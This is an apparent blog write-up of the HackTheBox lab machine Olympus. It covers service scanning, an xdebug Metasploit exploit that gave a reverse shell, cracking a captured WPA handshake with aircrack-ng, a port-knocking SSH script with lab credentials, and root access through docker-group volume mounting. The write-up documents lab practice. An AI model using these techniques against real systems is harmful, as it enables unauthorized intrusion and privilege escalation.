---
title:  "Hackthebox - Olympus"
date:   2018-09-23 02:50:23 +0200
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-olympus.png" alt="Info Card" %}

## user

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) revealed several open ports:

```bash
# Nmap 7.70 scan initiated Thu Sep  6 21:47:48 2018 as: nmap -sV -sC -oA olympus 10.10.10.83
Nmap scan report for 10.10.10.83
Host is up (0.11s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
| dns-nsid: 
|_  bind.version: Bind
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    Bind
80/tcp   open     http    Apache httpd
|_http-server-header: Apache
|_http-title: Crete island - Olympus HTB
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-City of olympia
| ssh-hostkey: 
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.70%I=7%D=9/6%Time=5B9184A2%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\0
SF:\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.70%I=7%D=9/6%Time=5B91849D%P=x86_64-pc-linux-gnu%r(NUL
SF:L,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  6 21:49:07 2018 -- 1 IP address (1 host up) scanned in 79.23 seconds
```

Interestingly, port 53 (DNS server) is open. I tried to query the DNS server with the usual box domain without result. 

When opening `http://10.10.10.83` in a web browser, a picture of Zeus is shown. After looking closer at the HTTP request and response data, I noticed an unusual response header: `Xdebug: "2.5.5"`. I googled for that header and found out that it belongs to a PHP debugger. `searchsploit xdebug` shows the following result: 

```bash
--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------- ----------------------------------------
xdebug < 2.5.5 - OS Command Execution (Metasploit)             | exploits/php/remote/44568.rb
--------------------------------------------------------------- ----------------------------------------
```

Despite the claim that the exploit only works for xdebug before version 2.5.5, it worked for the given server. Getting a reverse shell is trivial because a Metasploit module is available as indicated in the above output.

The user getting a reverse shell is `www-data`, which is not enough for reading the user flag. However, a user `zeus` exists on the system and it it possible to read its home directory as `www-data`. Inside the home directory of zeus, there is another directory, `airgeddon`: 

```bash
$ ls -al /home/zeus/airgeddon
total 1100
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus    264 Apr  8 00:58 .editorconfig
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .git
-rw-r--r-- 1 zeus zeus    230 Apr  8 00:58 .gitattributes
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .github
-rw-r--r-- 1 zeus zeus     89 Apr  8 00:58 .gitignore
-rw-r--r-- 1 zeus zeus  15855 Apr  8 00:58 CHANGELOG.md
-rw-r--r-- 1 zeus zeus   3228 Apr  8 00:58 CODE_OF_CONDUCT.md
-rw-r--r-- 1 zeus zeus   6358 Apr  8 00:58 CONTRIBUTING.md
-rw-r--r-- 1 zeus zeus   3283 Apr  8 00:58 Dockerfile
-rw-r--r-- 1 zeus zeus  34940 Apr  8 00:58 LICENSE.md
-rw-r--r-- 1 zeus zeus   4425 Apr  8 00:58 README.md
-rw-r--r-- 1 zeus zeus 297711 Apr  8 00:58 airgeddon.sh
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 binaries
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 captured
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 imgs
-rw-r--r-- 1 zeus zeus  16315 Apr  8 00:58 known_pins.db
-rw-r--r-- 1 zeus zeus 685345 Apr  8 00:58 language_strings.sh
-rw-r--r-- 1 zeus zeus     33 Apr  8 00:58 pindb_checksum.txt
```

[airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) is "a multi-use bash script for Linux systems to audit wireless networks." However, the `captured` folder does not seem to be present in the git repo. Its content looks promising: 

```bash
$ ls -al /home/zeus/airgeddon/captured
total 304
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt
```

The file `papyrus.txt` contains the following text: `Captured while flying. I'll banish him to Olympia - Zeus`

```bash
$ file captured.cap
captured.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
```

Therefore, I downloaded it to my system for further analysis. `aircrack-ng` shows that the dump contains a WPA handshake of teh network `Too_cl0se_to_th3_Sun`. I cracked the WLAN password using `aircrack-ng` with the rockyou wordlist:

```bash
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt captured.cap
	  Opening captured.cap
	  Read 6498 packets.
	  
	     #  BSSID              ESSID                     Encryption
	  
	     1  F4:EC:38:AB:A8:A9  Too_cl0se_to_th3_Sun      WPA (1 handshake)
	  
	  Choosing first network as target.
	  
	  Opening captured.cap

	  <snip>

	  [00:44:09] 5306024/9822768 keys tested (1501.99 k/s)

      Time left: 50 minutes, 9 seconds                          54.02%

                        KEY FOUND! [ flightoficarus ]


      Master Key     : FA C9 FB 75 B7 7E DC 86 CC C0 D5 38 88 75 B8 5A
                       88 3B 75 31 D9 C3 23 C8 68 3C DB FA 0F 67 3F 48

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38
```

Being able to access the box via SSH requires a bit of guesswork: The username `icarus` has the password `Too_cl0se_to_th3_Sun`. ssh access does not work on port 22, in the nmap scan the port shows up as filtered, but on port 2222 it is possible to access the box using those credentials. However, instead of the expected `user.txt` file, only a file containing a cryptic message is present in the user's home directory:


```bash
icarus@620b296204a3:~$ ls -al
total 32
drwxr-xr-x 1 icarus icarus 4096 Apr 15 21:50 .
drwxr-xr-x 1 root   root   4096 Apr  8 11:59 ..
-rw------- 1 icarus icarus  381 Sep 22 12:33 .bash_history
-rw-r--r-- 1 icarus icarus  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 icarus icarus 3771 Aug 31  2015 .bashrc
drwx------ 2 icarus icarus 4096 Apr 15 16:44 .cache
-rw-r--r-- 1 icarus icarus  655 May 16  2017 .profile
-rw-r--r-- 1 root   root     85 Apr 15 21:50 help_of_the_gods.txt
icarus@620b296204a3:~$ cat help_of_the_gods.txt

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
```

First I wondered about what to do with the mentioned domain. Then I remembered the DNS server from the `nmap` dump...

Querying DNS provided the following results when checking for TXT entries:

```bash
$ dig @10.10.10.83 TXT ctfolympus.htb

; <<>> DiG 9.11.3-1-Debian <<>> @10.10.10.83 TXT ctfolympus.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10859
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;ctfolympus.htb.                        IN      TXT

;; ANSWER SECTION:
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"

;; AUTHORITY SECTION:
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.

;; ADDITIONAL SECTION:
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120

;; Query time: 22 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Fri Sep 07 22:07:08 CEST 2018
;; MSG SIZE  rcvd: 205
```

As SSH on port 22 seems to be filtered, this message seems to tell that port knocking should be used to access the server as user prometheus. The password is probably `St34l_th3_F1re!`.

Those assumtions were true. I wrote the following quick (and dirty) script to automate the procedure of connecting to SSH on port 22 or moving files to the box via SCP: 

```bash
#!/bin/bash

mode=$1
src=$2
target=$3

echo "Knocking..."
for x in 3456 8234 62431; do
        nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.83
done

export SSHPASS="St34l_th3_F1re!"

if [ "$mode" = "ssh" ]; then
        sshpass -e ssh "prometheus@10.10.10.83"
else
        sshpass -e scp -r "prometheus@10.10.10.83:$src" "$target"
fi
```

This time, the user flag is present in the home directory.


## root

Besides the user flag, another help-of-gods file could be found in the user directory, containing another cryptic message: 

```bash
prometheus@olympus:~$ ls
msg_of_gods.txt  user.txt
prometheus@olympus:~$ cat msg_of_gods.txt

Only if you serve well to the gods, you'll be able to enter into the

      _
 ___ | | _ _ ._ _ _  ___  _ _  ___
/ . \| || | || ' ' || . \| | |<_-<
\___/|_|`_. ||_|_|_||  _/`___|/__/
        <___'       |_|

```


I uploaded [linenum](https://github.com/rebootuser/LinEnum) to the box. The following information from the output could probably be useful:

```bash
[+] We're a member of the (docker) group - could possibly misuse these rights!
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
```

A few Docker containers are already running on the box, the web server as well as the SSH server on port 2222 and the DNS server each run in their own Docker container, which, retrospectively, makes sense.

```bash
prometheus@olympus:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES                                                       
f00ba96171c5        crete               "docker-php-entrypoi…"   5 months ago        Up 5 hours          0.0.0.0:80->80/tcp                       crete 
ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   5 months ago        Up 5 hours          0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp   rhodes 
620b296204a3        olympia             "/usr/sbin/sshd -D"      5 months ago        Up 5 hours          0.0.0.0:2222->22/tcp                     olympia
prometheus@olympus:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
crete               latest              31be8149528e        5 months ago        450MB
olympia             latest              2b8904180780        5 months ago        209MB
rodhes              latest              82fbfd61b8c1        5 months ago        215MB
```

Putting it all together, it was possible to mount the home directory of the root user as volume inside a Docker container and read the contents of the flag file using the following command:

```bash
prometheus@olympus:~$ docker run -v /root:/root olympia cat /root/root.txt
```
